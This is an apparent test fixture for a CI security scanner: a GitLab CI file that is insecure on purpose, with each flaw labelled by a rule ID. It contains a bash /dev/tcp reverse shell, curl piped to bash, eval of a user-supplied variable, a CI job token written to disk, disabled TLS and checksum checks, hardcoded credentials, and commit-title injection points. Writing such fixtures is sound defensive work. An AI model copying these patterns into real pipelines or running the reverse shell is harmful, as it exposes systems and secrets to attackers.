# Realistic insecure GitLab CI exhibiting every GL-* failure mode.
include:
  - project: 'templates/ci'
    ref: main
  - remote: 'https://gitlab.example.com/snippets/42/raw'
  # GL-011 — local include resolved from the MR branch.
  - local: 'ci/local-helpers.yml'
  # GL-042 — CI/CD component pinned to a mutable version (~latest). The
  # component project can re-point it and ship arbitrary pipeline code.
  - component: 'gitlab.example.com/ci/templates/build@~latest'

image: python:latest

# GL-033 — document-root before_script interpolates the
# pusher-controlled commit title. Every job in the pipeline
# inherits this script line and runs it verbatim, so a single
# malicious commit message is N injections at once. iter_jobs
# skips this top-level keyword so GL-002 misses it.
before_script:
  - echo "Build for ${CI_COMMIT_TITLE}"

# GL-028 — top-level services image not pinned.
services:
  - postgres:latest
  # GL-039 — Docker-in-Docker daemon; TLS disabled via DOCKER_TLS_CERTDIR below.
  - name: docker:27-dind
    command: ["--host=tcp://0.0.0.0:2375"]

variables:
  AWS_ACCESS_KEY_ID: AKIAZ3MHALF2TESTHIJK
  DATABASE_PASSWORD: hunter2
  # GL-043 — a GitLab-managed security scanner switched off pipeline-wide.
  SECRET_DETECTION_DISABLED: "true"
  DEPLOY_TARGET: production
  # GL-037 — Go module checksum / sum-db verification disabled.
  GOSUMDB: "off"
  GOFLAGS: -insecure
  # GL-038 — debug trace dumps every variable (incl. masked secrets) to the log.
  CI_DEBUG_TRACE: "true"
  # GL-039 — empty cert dir reverts the dind daemon to the plaintext 2375 socket.
  DOCKER_TLS_CERTDIR: ""
  DOCKER_HOST: "tcp://docker:2375"

# GL-011 — opt the pipeline into MR triggering so include: local fires.
workflow:
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
    - if: '$CI_COMMIT_BRANCH'

# GL-012 — cache key derived from MR-controlled commit ref.
cache:
  key: build-${CI_COMMIT_REF_NAME}
  paths:
    - .cache/

stages:
  - test
  - ingest
  - deploy

unit-tests:
  stage: test
  image: node
  script:
    - echo "Running tests for MR ${CI_MERGE_REQUEST_TITLE}"
    - npm test

# GL-010 — multi-project artifact ingestion without verification.
ingest-upstream:
  stage: ingest
  needs:
    - project: 'platform/build'
      job: 'package'
      ref: main
      artifacts: true
  script:
    # GL-040 — CI_JOB_TOKEN used to clone a DIFFERENT project.
    - git clone https://gitlab-ci-token:${CI_JOB_TOKEN}@gitlab.example.com/platform/internal-libs.git
    - ./package/install.sh

deploy-prod:
  stage: deploy
  # GL-014 — self-managed runner without ephemeral tag.
  # GL-032 — ``$CI_COMMIT_REF_NAME`` (the pusher-controlled branch /
  # tag) is in the runner-tag list, so the pusher picks which tagged
  # runner pool the deploy lands on.
  tags:
    - custom-runner
    - $CI_COMMIT_REF_NAME
  # GL-029 — manual deploy without allow_failure:false silently
  # defaults to allow_failure:true, so the pipeline reports success
  # even when an operator never clicks the button.
  when: manual
  script:
    # GL-041 — IaC apply reachable from the MR-triggered pipeline. The
    # workflow: rules above admit merge_request_event and this job
    # declares no rules:/only:, so it inherits MR reachability; applying
    # the MR branch's Terraform runs its code with the deploy creds.
    - terraform apply -auto-approve
    - ./scripts/deploy.sh

# GL-030 — job-level trigger:include: pulls a child pipeline from a
# floating branch in another project (same class of risk as GL-005
# but nested under trigger: rather than the top-level include:).
trigger-child:
  stage: deploy
  trigger:
    include:
      - project: 'platform/child-pipelines'
        ref: main

# GL-031 — id_tokens: declared without an audience pin AND without
# an environment binding. The empty ``aud:`` accepts any consumer's
# OIDC trust; the missing ``environment:`` means any branch can
# drive the role assumption.
oidc-deploy:
  stage: deploy
  id_tokens:
    AWS_ID_TOKEN:
      aud: ""
  script:
    - aws sts assume-role-with-web-identity
        --role-arn arn:aws:iam::123456789012:role/release
        --role-session-name release
        --web-identity-token "$AWS_ID_TOKEN"
    - aws s3 cp dist/ s3://release-bucket/ --recursive

# GL-016 — curl piped to shell.
# GL-017 — docker run --privileged.
# GL-018 — pip install from insecure source.
# GL-019 — no vulnerability scanning step.
# GL-020 — CI_JOB_TOKEN written to file.
insecure-setup:
  stage: test
  script:
    - curl https://example.com/setup.sh | bash
    - docker run --privileged myimage
    - pip install --trusted-host pypi.internal.com package
    - echo "$CI_JOB_TOKEN" >> /tmp/token.txt
    # GL-021: package install without lockfile enforcement.
    - npm install
    # GL-022: dependency update bypasses lockfile pins.
    - npm update
    # GL-025: evidence of malicious activity — bash /dev/tcp reverse shell.
    - bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
    # GL-023: TLS verification bypass.
    - git config --global http.sslVerify false
    # GL-026: dangerous shell idiom — eval re-parses the value as shell.
    - eval "$CI_CUSTOM_CMD"
    # GL-027: pip install from an unpinned git URL.
    - pip install git+https://example.com/internal/helper.git

# TAINT-004: dotenv-artifact cross-job taint flow. The producer
# job below pipes ``$CI_COMMIT_TITLE`` into a dotenv file; the
# consumer needs:-imports the var as ``$TITLE`` and unquotes it
# back into a shell command. GL-002 catches the producer's
# inner interpolation; TAINT-004 catches the actual injection
# at the consumer that the single-rule scanner can't see.
taint-extract:
  stage: test
  script:
    - echo "TITLE=$CI_COMMIT_TITLE" > taint.env
  artifacts:
    reports:
      dotenv: taint.env

taint-build:
  stage: test
  needs: [taint-extract]
  script:
    - echo Building tagged $TITLE

# TAINT-008: extends-chain taint propagation. ``.tainted-base``
# is a hidden template that pipes ``$CI_COMMIT_REF_NAME`` into a
# variables: entry; ``deploy-from-extends`` extends it and
# references ``$BRANCH`` unquoted in its script. GL-002 misses
# this because its iter_jobs skips hidden templates; TAINT-008
# walks the extends chain to surface the inherited taint.
.tainted-base:
  variables:
    BRANCH: $CI_COMMIT_REF_NAME

deploy-from-extends:
  stage: test
  extends: .tainted-base
  script:
    - echo Deploying branch $BRANCH
    - echo "Token is $DEPLOY_TOKEN"
